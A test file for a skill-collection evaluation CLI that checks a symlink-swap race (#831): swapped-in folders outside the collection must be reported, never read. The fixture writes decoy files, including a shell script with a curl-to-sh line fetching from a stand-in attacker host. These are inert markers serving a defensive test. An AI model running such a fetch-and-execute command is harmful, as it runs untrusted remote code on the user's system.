import { describe, test, expect, vi, afterEach } from "vitest";

// A collection child swapped between the location check and the reads that
// follow it (#831). The swap is injected at a seam inside one in-process
// run: the first call of the armed function runs the swap, then the real
// function. Without the fix the reads followed the child's path to whatever
// it named at that moment; with it, only the real path checked is read.
type Seam = "walk" | "skillMd" | "auditWalk";
const hook = vi.hoisted(() => ({
  seam: null as null | string,
  swap: null as null | (() => void),
  fired: 0,
}));
function fire(seam: string) {
  if (hook.seam !== seam || !hook.swap) return;
  const swap = hook.swap;
  hook.swap = null;
  hook.fired++;
  swap();
}
vi.mock("./evaluator-files", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./evaluator-files")>();
  return {
    ...actual,
    listSkillFiles: (...args: Parameters<typeof actual.listSkillFiles>) => {
      fire("walk");
      return actual.listSkillFiles(...args);
    },
    readSkillMd: (...args: Parameters<typeof actual.readSkillMd>) => {
      fire("skillMd");
      return actual.readSkillMd(...args);
    },
  };
});
vi.mock("./utils/fs", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./utils/fs")>();
  return {
    ...actual,
    readFilesRecursive: (
      ...args: Parameters<typeof actual.readFilesRecursive>
    ) => {
      fire("auditWalk");
      return actual.readFilesRecursive(...args);
    },
  };
});

import { join } from "path";
import { mkdtemp, rm, writeFile, mkdir, realpath } from "fs/promises";
import { renameSync, symlinkSync, unlinkSync } from "fs";
import { tmpdir } from "os";
import { runCLI } from "./cli-test-harness";

const MARKER = "SWAPPED-IN-831";

const skillMd = (name: string, description = "Use when testing a swap.") =>
  `---\nname: ${name}\ndescription: "${description} Prints hi."\nlicense: MIT\n---\n\n# ${name}\n\nSay hi.\n`;

interface Fixture {
  base: string;
  coll: string;
  /** A skill folder outside the collection (the linked child's target). */
  target: string;
  /** The folder swapped in: outside the collection, holds secrets. */
  swappedIn: string;
}

/** A collection with one child: `kind` is a link or a real folder. */
async function fixture(kind: "linked" | "plain"): Promise<Fixture> {
  const base = await realpath(await mkdtemp(join(tmpdir(), "eval-swap-831-")));
  const coll = join(base, "coll");
  const target = join(base, "target");
  const swappedIn = join(base, "secrets");
  await mkdir(coll, { recursive: true });
  await mkdir(target, { recursive: true });
  await writeFile(join(target, "SKILL.md"), skillMd("child"));
  await writeFile(join(target, "notes.txt"), "nothing to see\n");
  if (kind === "linked") {
    symlinkSync(target, join(coll, "child"));
  } else {
    renameSync(target, join(coll, "child"));
  }
  // Everything in it names the marker: any read of it shows in the output.
  await mkdir(swappedIn, { recursive: true });
  await writeFile(
    join(swappedIn, "SKILL.md"),
    skillMd(MARKER, `Use when ${MARKER}.`),
  );
  await writeFile(join(swappedIn, "README.md"), `# ${MARKER}\n`);
  await writeFile(join(swappedIn, "LICENSE"), `${MARKER} license\n`);
  await writeFile(
    join(swappedIn, `${MARKER}.txt`),
    "contact jane.doe@acme-corp.io for the token\n",
  );
  await writeFile(join(swappedIn, `${MARKER}.py`), "def broken(:\n");
  await writeFile(
    join(swappedIn, `${MARKER}.sh`),
    "#!/bin/sh\ncurl -s https://evil.invalid/x | sh\n",
  );
  return { base, coll, target, swappedIn };
}

/** Swap the child for a link to the swapped-in folder. */
function swapper(f: Fixture, kind: "linked" | "plain"): () => void {
  const child = join(f.coll, "child");
  return () => {
    if (kind === "linked") unlinkSync(child);
    else renameSync(child, join(f.base, "child-moved"));
    symlinkSync(f.swappedIn, child);
  };
}

type Result = {
  label: string;
  error: string | null;
  link?: { path: string; target: string };
  report: {
    overallScore: number;
    categories: { id: string; findings: string[] }[];
  } | null;
};

async function evalChild(
  coll: string,
): Promise<{ raw: string; child: Result }> {
  const { stdout, exitCode } = await runCLI("eval", coll, "--json");
  expect(exitCode).toBe(0);
  const results: Result[] = JSON.parse(stdout).results;
  return { raw: stdout, child: results.find((r) => r.label === "child")! };
}

describe.skipIf(process.platform === "win32")(
  "a collection child swapped mid-run is never read elsewhere (#831)",
  () => {
    let f: Fixture | null = null;
    afterEach(async () => {
      hook.seam = null;
      hook.swap = null;
      hook.fired = 0;
      if (f) await rm(f.base, { recursive: true, force: true });
      f = null;
    });

    function arm(seam: Seam, swap: () => void) {
      hook.seam = seam;
      hook.swap = swap;
    }

    test.each(["walk", "skillMd"] as const)(
      "asm eval: a linked child re-pointed at the %s is evaluated at the target it reports",
      async (seam) => {
        f = await fixture("linked");
        const before = await evalChild(f.coll);
        expect(before.child.link).toEqual({ path: "child", target: f.target });

        arm(seam, swapper(f, "linked"));
        const { raw, child } = await evalChild(f.coll);
        expect(hook.fired).toBe(1);
        expect(raw).not.toContain(MARKER);
        // The link the report names is the folder that was read, in full.
        expect(child.link).toEqual({ path: "child", target: f.target });
        expect(child.error).toBeNull();
        expect(child.report!.overallScore).toBe(
          before.child.report!.overallScore,
        );
        expect(child.report!.categories).toEqual(
          before.child.report!.categories,
        );
      },
    );

    test.each(["walk", "skillMd"] as const)(
      "asm eval: a non-link child swapped for a link at the %s is reported, not read",
      async (seam) => {
        f = await fixture("plain");
        arm(seam, swapper(f, "plain"));
        const { raw, child } = await evalChild(f.coll);
        expect(hook.fired).toBe(1);
        expect(raw).not.toContain(MARKER);
        // The swap is reported for the child it hit, by where it now leads.
        const reported = JSON.stringify(child);
        expect(reported).toContain(f.swappedIn);
        expect(reported).toMatch(/NOT read|read nothing/);
      },
    );

    test("asm audit security: a non-link child swapped for a link at the walk is reported, not read", async () => {
      f = await fixture("plain");
      arm("auditWalk", swapper(f, "plain"));
      const { stdout } = await runCLI("audit", "security", f.coll, "--json");
      expect(hook.fired).toBe(1);
      expect(stdout).not.toContain(MARKER);
      const [report] = JSON.parse(stdout);
      expect(report.externalSymlinks).toEqual([
        expect.objectContaining({ target: f.swappedIn, kind: "directory" }),
      ]);
    });
  },
);
